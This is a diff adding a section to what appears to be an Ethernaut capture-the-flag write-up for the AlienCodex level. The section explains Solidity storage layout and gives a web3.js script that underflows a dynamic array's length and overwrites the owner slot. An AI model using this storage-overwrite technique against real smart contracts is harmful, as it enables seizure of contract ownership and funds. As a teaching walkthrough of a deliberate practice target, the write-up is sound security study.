@@ -363,3 +363,92 @@ await web3.eth.sendTransaction({
 ## 18. MagicNumber
 Don't really think this is a security challenge, it's more of a general coding challenge about how you can deploy a very small sized contract! I probably won't ever need to use this so I'm going to skip this floor. Nonetheless, if you're interested to do this challenge, read this [solution](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2) by Nicole Zhu. 
 
+
+## 19. AlienCodex
+
+In order to solve this level, you need to understand about 3 things:
+1. Packing of storage variables to fit into one storage slot of 32bytes
+2. How values in dynamic arrays are stored
+3. How to modify an item outside of the size of the array.
+
+This [example](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/) & the [solidity documentation](https://solidity.readthedocs.io/en/latest/miscellaneous.html#bytes-and-string) should prove useful to understanding point 2. However, I would like to point out that there is a mistake in the example. If you can find the mistake, you probably have a solid understanding of point 2. Note that the solution below uses web3 to interact with the contract because there was an error on Ethernaut (0.5.0)'s end preventing me from getting an instance.
+```
+// After deploying your contract, you need to determine which is your instance contract. 
+// Find the transaction on etherscan, click on Internal Transactions
+// Look for the line "create_0_0... the To address represents your deployed contract
+
+// First you need to make contact
+var instance = "<insert contract instance here">
+
+// Check who is owner
+var ownerPayload = web3.eth.abi.encodeFunctionCall({
+    name: 'owner',
+    type: 'function',
+    inputs: []
+}, []); // 0x8da5cb5b
+
+await web3.eth.call({to: instance, data: ownerPayload});
+
+var makeContactPayload = web3.eth.abi.encodeFunctionCall({
+    name: 'make_contact',
+    type: 'function',
+    inputs: []
+}, []); // 0x58699c55
+
+await web3.eth.sendTransaction({to: instance, from: player, data: makeContactPayload});
+
+var concatenatedStorage = await web3.eth.getStorageAt(instance, 0); // 0x000000000000000000000001xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx where the x represents your address and 1 represents contact = true
+
+// Number of elements in dynamic array (codex) is stored at index 1 
+// Actual elements stored in dynamic array (codex) can be found at index uint256(keccak256(1)); // 
+80084422859880547211683076133703299733277748156566366325829078699459944778998
+// New elements added to dynamic array (codex) can be found at index uint256(keccak256(1)) + index in array e.g.
+// First element is found at uint256(keccak256(1)) + 0;
+// Second element is found at uint256(keccak256(1)) + 1;
+// Third element is found at uint256(keccak256(1)) + 2; 
+
+// We want to modify storage slot 0 since that is where owner is stored at. 
+// We need a value N such that uint256(keccak256(1)) + N = 0
+// 0 (or max value for uint256) - uint256(keccak256(1)) = N
+
+var maxVal = "115792089237316195423570985008687907853269984665640564039457584007913129639936"
+var arrayPos = "80084422859880547211683076133703299733277748156566366325829078699459944778998"
+var offset = (web3.utils.toBN(maxVal).sub(web3.utils.toBN(arrayPos))).toString();
+var elementAtIndexZero = await web3.eth.getStorageAt(instance, 0);
+var newElementAtIndexZero = `${elementAtIndexZero.slice(0, 26)}${player.slice(2,)}`
+
+var replaceIndexZeroPayload = web3.eth.abi.encodeFunctionCall({
+    name: 'revise',
+    type: 'function',
+    inputs: [{
+        type: 'uint256',
+        name: 'i'
+    },{
+        type: 'bytes32',
+        name: '_content'
+    }]
+}, [offset.toString(), newElementAtIndexZero]);
+
+// If you try to do 
+// await web3.eth.sendTransaction({to: instance, from: player, data: replaceIndexZeroPayload});
+// It will fail because you are trying to modify an index that is greater than the length of the array
+// I mean there's a reason why there is a retract() function right? haha.
+
+var retractPayload = web3.eth.abi.encodeFunctionCall({
+    name: 'retract',
+    type: 'function',
+    inputs: []
+}, []); // 0x47f57b32
+
+// Call retract as many times as you need such that the integer underflows
+await web3.eth.sendTransaction({to: instance, from: player, data: retractPayload});
+
+// You can check the size of the array by doing
+await web3.eth.getStorageAt(instance, 1);
+
+// Once it returns "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", you know that you're ready to replace the owner
+await web3.eth.sendTransaction({to: instance, from: player, data: replaceIndexZeroPayload});
+
+// Check that owner has been replaced successfully
+await web3.eth.call({to: instance, data: ownerPayload})
+```
